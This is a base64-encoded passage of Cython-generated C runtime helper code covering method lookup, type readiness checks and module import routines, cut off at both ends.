Km1ldGhvZCA9PSBOVUxMKTsKICAgIGlmICh1bmxpa2VseSh0cC0+dHBfZ2V0YXR0cm8gIT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICAgICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTsKICAgICAgICBnb3RvIHRyeV91bnBhY2s7CiAgICB9CiAgICBpZiAodW5saWtlbHkodHAtPnRwX2RpY3QgPT0gTlVMTCkgJiYgdW5saWtlbHkoUHlUeXBlX1JlYWR5KHRwKSA8IDApKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICBkZXNjciA9IF9QeVR5cGVfTG9va3VwKHRwLCBuYW1lKTsKICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHsKICAgICAgICBQeV9JTkNSRUYoZGVzY3IpOwojaWYgZGVmaW5lZChQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSAmJiBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SCiAgICAgICAgaWYgKF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUoZGVzY3IpLCBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSkKI2Vsc2UKICAgICAgICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgICAgICAgaWYgKGxpa2VseShQeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSB8fCBfX1B5eF9JU19UWVBFKGRlc2NyLCAmUHlNZXRob2REZXNjcl9UeXBlKSB8fCBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSkpCiAgICAgICAgI2Vsc2UKICAgICAgICBpZiAobGlrZWx5KFB5RnVuY3Rpb25fQ2hlY2soZGVzY3IpIHx8IF9fUHl4X0lTX1RZUEUoZGVzY3IsICZQeU1ldGhvZERlc2NyX1R5cGUpKSkKICAgICAgICAjZW5kaWYKI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICBtZXRoX2ZvdW5kID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBmID0gUHlfVFlQRShkZXNjciktPnRwX2Rlc2NyX2dldDsKICAgICAgICAgICAgaWYgKGYgIT0gTlVMTCAmJiBQeURlc2NyX0lzRGF0YShkZXNjcikpIHsKICAgICAgICAgICAgICAgIGF0dHIgPSBmKGRlc2NyLCBvYmosIChQeU9iamVjdCAqKVB5X1RZUEUob2JqKSk7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgZGljdHB0ciA9IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiAgICBpZiAoZGljdHB0ciAhPSBOVUxMICYmIChkaWN0ID0gKmRpY3RwdHIpICE9IE5VTEwpIHsKICAgICAgICBQeV9JTkNSRUYoZGljdCk7CiAgICAgICAgYXR0ciA9IF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKGRpY3QsIG5hbWUpOwogICAgICAgIGlmIChhdHRyICE9IE5VTEwpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKGF0dHIpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGljdCk7CiAgICAgICAgICAgIFB5X1hERUNSRUYoZGVzY3IpOwogICAgICAgICAgICBnb3RvIHRyeV91bnBhY2s7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihkaWN0KTsKICAgIH0KICAgIGlmIChtZXRoX2ZvdW5kKSB7CiAgICAgICAgKm1ldGhvZCA9IGRlc2NyOwogICAgICAgIHJldHVybiAxOwogICAgfQogICAgaWYgKGYgIT0gTlVMTCkgewogICAgICAgIGF0dHIgPSBmKGRlc2NyLCBvYmosIChQeU9iamVjdCAqKVB5X1RZUEUob2JqKSk7CiAgICAgICAgUHlfREVDUkVGKGRlc2NyKTsKICAgICAgICBnb3RvIHRyeV91bnBhY2s7CiAgICB9CiAgICBpZiAobGlrZWx5KGRlc2NyICE9IE5VTEwpKSB7CiAgICAgICAgKm1ldGhvZCA9IGRlc2NyOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZSh0cCk7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfQXR0cmlidXRlRXJyb3IsCiAgICAgICAgICAgICAgICAgIiciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBvYmplY3QgaGFzIG5vIGF0dHJpYnV0ZSAnJVUnIiwKICAgICAgICAgICAgICAgICB0eXBlX25hbWUsIG5hbWUpOwogICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHR5cGVfbmFtZSk7CiAgICByZXR1cm4gMDsKI2Vsc2UKICAgIGF0dHIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG9iaiwgbmFtZSk7CiAgICBnb3RvIHRyeV91bnBhY2s7CiNlbmRpZgp0cnlfdW5wYWNrOgojaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAobGlrZWx5KGF0dHIpICYmIFB5TWV0aG9kX0NoZWNrKGF0dHIpICYmIGxpa2VseShQeU1ldGhvZF9HRVRfU0VMRihhdHRyKSA9PSBvYmopKSB7CiAgICAgICAgUHlPYmplY3QgKmZ1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKGF0dHIpOwogICAgICAgIFB5X0lOQ1JFRihmdW5jdGlvbik7CiAgICAgICAgUHlfREVDUkVGKGF0dHIpOwogICAgICAgICptZXRob2QgPSBmdW5jdGlvbjsKICAgICAgICByZXR1cm4gMTsKICAgIH0KI2VuZGlmCiAgICAqbWV0aG9kID0gYXR0cjsKICAgIHJldHVybiAwOwp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpIHsKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKQogICAgUHlPYmplY3QgKmFyZ3NbMV0gPSB7b2JqfTsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7CiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZzsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsTm9Bcmc7CiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMSB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7CiNlbHNlCiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICBpbnQgaXNfbWV0aG9kID0gX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKG9iaiwgbWV0aG9kX25hbWUsICZtZXRob2QpOwogICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIG9iaik7CiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgZ290byBiYWQ7CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcobWV0aG9kKTsKICAgIFB5X0RFQ1JFRihtZXRob2QpOwpiYWQ6CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKSB7CiAgICBQeV9zc2l6ZV90IGksIG47CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUoYmFzZXMpOwojZWxzZQogICAgbiA9IFB5VHVwbGVfU2l6ZShiYXNlcyk7CiAgICBpZiAodW5saWtlbHkobiA8IDApKSByZXR1cm4gLTE7CiNlbmRpZgogICAgZm9yIChpID0gMTsgaSA8IG47IGkrKykKICAgIHsKICAgICAgICBQeVR5cGVPYmplY3QgKmI7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5U2VxdWVuY2VfR2V0SXRlbShiYXNlcywgaSk7CiAgICAgICAgaWYgKCFiMCkgcmV0dXJuIC0xOwojZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HRVRfSVRFTShiYXNlcywgaSk7CiNlbHNlCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HZXRJdGVtKGJhc2VzLCBpKTsKICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7CiNlbmRpZgogICAgICAgIGIgPSAoUHlUeXBlT2JqZWN0KikgYjA7CiAgICAgICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShiLCBQeV9UUEZMQUdTX0hFQVBUWVBFKSkKICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7CiAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAiYmFzZSBjbGFzcyAnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgaXMgbm90IGEgaGVhcCB0eXBlIiwgYl9uYW1lKTsKICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGJfbmFtZSk7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICBQeV9ERUNSRUYoYjApOwojZW5kaWYKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICBpZiAoZGljdG9mZnNldCA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgUHlfc3NpemVfdCBiX2RpY3RvZmZzZXQgPSAwOwojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IGItPnRwX2RpY3RvZmZzZXQ7CiNlbHNlCiAgICAgICAgICAgIFB5T2JqZWN0ICpweV9iX2RpY3RvZmZzZXQgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKChQeU9iamVjdCopYiwgIl9fZGljdG9mZnNldF9fIik7CiAgICAgICAgICAgIGlmICghcHlfYl9kaWN0b2Zmc2V0KSBnb3RvIGRpY3RvZmZzZXRfcmV0dXJuOwogICAgICAgICAgICBiX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2JfZGljdG9mZnNldCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihweV9iX2RpY3RvZmZzZXQpOwogICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47CiNlbmRpZgogICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0KSB7CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTsKICAgICAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiZXh0ZW5zaW9uIHR5cGUgJyUuMjAwcycgaGFzIG5vIF9fZGljdF9fIHNsb3QsICIKICAgICAgICAgICAgICAgICAgICAgICAgImJ1dCBiYXNlIHR5cGUgJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIGhhczogIgogICAgICAgICAgICAgICAgICAgICAgICAiZWl0aGVyIGFkZCAnY2RlZiBkaWN0IF9fZGljdF9fJyB0byB0aGUgZXh0ZW5zaW9uIHR5cGUgIgogICAgICAgICAgICAgICAgICAgICAgICAib3IgYWRkICdfX3Nsb3RzX18gPSBbLi4uXScgdG8gdGhlIGJhc2UgdHlwZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgYl9uYW1lKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTsKICAgICAgICAgICAgICAgIH0KI2lmICFDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICAgICAgICAgICBkaWN0b2Zmc2V0X3JldHVybjoKI2VuZGlmCiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICAgICAgUHlfREVDUkVGKGIwKTsKI2VuZGlmCiAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5X0RFQ1JFRihiMCk7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIDA7Cn0KI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKFB5VHlwZU9iamVjdCAqdCkgewogICAgd2hpbGUgKHQpIHsKICAgICAgICBQeU9iamVjdCAqYmFzZXMgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlcywgUHlPYmplY3QqKTsKICAgICAgICBpZiAoYmFzZXMpIHsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHQgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX1JlYWR5KFB5VHlwZU9iamVjdCAqdCkgewojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgICAodm9pZClfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZTsKI2VuZGlmCiAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpOwojZWxzZQogICAgaW50IHI7CiAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKHQpKSB7CiAgICAgICAgcmV0dXJuIFB5VHlwZV9SZWFkeSh0KTsKICAgIH0KICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopOwogICAgaWYgKGJhc2VzICYmIHVubGlrZWx5KF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKHQtPnRwX25hbWUsIHQtPnRwX2RpY3RvZmZzZXQsIGJhc2VzKSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIC0xOwojaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pCiAgICB7CiAgICAgICAgaW50IGdjX3dhc19lbmFibGVkOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjEKICAgICAgICBnY193YXNfZW5hYmxlZCA9IFB5R0NfRGlzYWJsZSgpOwogICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwogICAgI2Vsc2UKICAgICAgICBQeU9iamVjdCAqcmV0LCAqcHlfc3RhdHVzOwogICAgICAgIFB5T2JqZWN0ICpnYyA9IE5VTEw7CiAgICAgICAgI2lmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0rMCA+PSAweDA3MDMwNDAwKSAmJlwKICAgICAgICAgICAgICAgICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMCiAgICAgICAgZ2MgPSBQeUltcG9ydF9HZXRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIGdjID0gUHlJbXBvcnRfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpOwogICAgICAgIGlmICh1bmxpa2VseSghZ2MpKSByZXR1cm4gLTE7CiAgICAgICAgcHlfc3RhdHVzID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaXNlbmFibGVkKTsKICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXR1cykpIHsKICAgICAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICBnY193YXNfZW5hYmxlZCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9zdGF0dXMpOwogICAgICAgIFB5X0RFQ1JFRihweV9zdGF0dXMpOwogICAgICAgIGlmIChnY193YXNfZW5hYmxlZCA+IDApIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGlzYWJsZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0KSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYocmV0KTsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdjX3dhc19lbmFibGVkID09IC0xKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgI2VuZGlmCiAgICAgICAgdC0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19IRUFQVFlQRTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEU7CiNlbmRpZgojZWxzZQogICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwojZW5kaWYKICAgIHIgPSBQeVR5cGVfUmVhZHkodCk7CiNpZiAhZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgICAgICB0LT50cF9mbGFncyAmPSB+UHlfVFBGTEFHU19IRUFQVFlQRTsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxCiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkKQogICAgICAgICAgICBQeUdDX0VuYWJsZSgpOwogICAgI2Vsc2UKICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRwLCAqdiwgKnRiOwogICAgICAgICAgICBQeUVycl9GZXRjaCgmdHAsICZ2LCAmdGIpOwogICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbmFibGUpOwogICAgICAgICAgICBpZiAobGlrZWx5KHJldCB8fCByID09IC0xKSkgewogICAgICAgICAgICAgICAgUHlfWERFQ1JFRihyZXQpOwogICAgICAgICAgICAgICAgUHlFcnJfUmVzdG9yZSh0cCwgdiwgdGIpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0cCk7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHYpOwogICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgICAgICAgICByID0gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICNlbmRpZgogICAgfQojZW5kaWYKICAgIHJldHVybiByOwojZW5kaWYKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpIHsKICAgIFB5T2JqZWN0ICptb2R1bGUgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2RpY3QgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2xpc3QgPSAwOwogICAgZW1wdHlfZGljdCA9IFB5RGljdF9OZXcoKTsKICAgIGlmICh1bmxpa2VseSghZW1wdHlfZGljdCkpCiAgICAgICAgZ290byBiYWQ7CiAgICBpZiAobGV2ZWwgPT0gLTEpIHsKICAgICAgICBjb25zdCBjaGFyKiBwYWNrYWdlX3NlcCA9IHN0cmNocihfX1B5eF9NT0RVTEVfTkFNRSwgJy4nKTsKICAgICAgICBpZiAocGFja2FnZV9zZXAgIT0gKDApKSB7CiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KAogICAgICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSB7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfSW1wb3J0RXJyb3IpKSkKICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgbGV2ZWwgPSAwOwogICAgfQogICAgaWYgKCFtb2R1bGUpIHsKICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdCgKICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCBsZXZlbCk7CiAgICB9CmJhZDoKICAgIFB5X1hERUNSRUYoZW1wdHlfZGljdCk7CiAgICBQeV9YREVDUkVGKGVtcHR5X2xpc3QpOwogICAgcmV0dXJuIG1vZHVsZTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlLCBQeV9zc2l6ZV90IGNvdW50KSB7CiAgICBQeU9iamVjdCAqcGFydGlhbF9uYW1lID0gTlVMTCwgKnNsaWNlID0gTlVMTCwgKnNlcCA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IHNpemU7CiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKHBhcnRzX3R1cGxlKTsKI2Vsc2UKICAgIHNpemUgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpOwogICAgaWYgKHNpemUgPCAwKSBnb3RvIGJhZDsKI2VuZGlmCiAgICBpZiAobGlrZWx5KHNpemUgPT0gY291bnQpKSB7CiAgICAgICAgcGFydGlhbF9uYW1lID0gbmFtZTsKICAgIH0gZWxzZSB7CiAgICAgICAgc2xpY2UgPSBQeVNlcXVlbmNlX0dldFNsaWNlKHBhcnRzX3R1cGxlLCAwLCBjb3VudCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzbGljZSkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIHNlcCA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiLiIsIDEpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VwKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgcGFydGlhbF9uYW1lID0gUHlVbmljb2RlX0pvaW4oc2VwLCBzbGljZSk7CiAgICB9CiAgICBQeUVycl9Gb3JtYXQoCiAgICAgICAgUHlFeGNfTW9kdWxlTm90Rm91bmRFcnJvciwKICAgICAgICAiTm8gbW9kdWxlIG5hbWVkICclVSciLCBwYXJ0aWFsX25hbWUpOwpiYWQ6CiAgICBQeV9YREVDUkVGKHNlcCk7CiAgICBQeV9YREVDUkVGKHNsaWNlKTsKICAgIFB5X1hERUNSRUYocGFydGlhbF9uYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAoUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7CiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZUFlfVkVSU0lPTl9OVU0gIDwgMHgwNzAzMDQwMCkgfHxcCiAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7CiAgICBpZiAodW5saWtlbHkoIW1vZHVsZXMpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIobW9kdWxlcywgbmFtZSk7CiAgICBQeV9YSU5DUkVGKGltcG9ydGVkX21vZHVsZSk7CiNlbHNlCiAgICBpbXBvcnRlZF9tb2R1bGUgPSBQeUltcG9ydF9HZXRNb2R1bGUobmFtZSk7CiNlbmRpZgogICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkgewogICAgUHlfc3NpemVfdCBpLCBucGFydHM7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbnBhcnRzID0gUHlUdXBsZV9HRVRfU0laRShwYXJ0c190dXBsZSk7CiNlbHNlCiAgICBucGFydHMgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpOwogICAgaWYgKG5wYXJ0cyA8IDApIHJldHVybiBOVUxMOwojZW5kaWYKICAgIGZvciAoaT0xOyBpIDwgbnBhcnRzICYmIG1vZHVsZTsgaSsrKSB7CiAgICAgICAgUHlPYmplY3QgKnBhcnQsICpzdWJtb2R1bGU7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIHBhcnQgPSBQeVR1cGxlX0dFVF9JVEVNKHBhcnRzX3R1cGxlLCBpKTsKI2Vsc2UKICAgICAgICBwYXJ0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHBhcnRzX3R1cGxlLCBpKTsKICAgICAgICBpZiAoIXBhcnQpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICBzdWJtb2R1bGUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtb2R1bGUsIHBhcnQpOwojaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKICAgICAgICBQeV9ERUNSRUYocGFydCk7CiNlbmRpZgogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgICAgIG1vZHVsZSA9IHN1Ym1vZHVsZTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkgewogICAgICAgIHJldHVybiBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0Vycm9yKG5hbWUsIHBhcnRzX3R1cGxlLCBpKTsKICAgIH0KICAgIHJldHVybiBtb2R1bGU7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF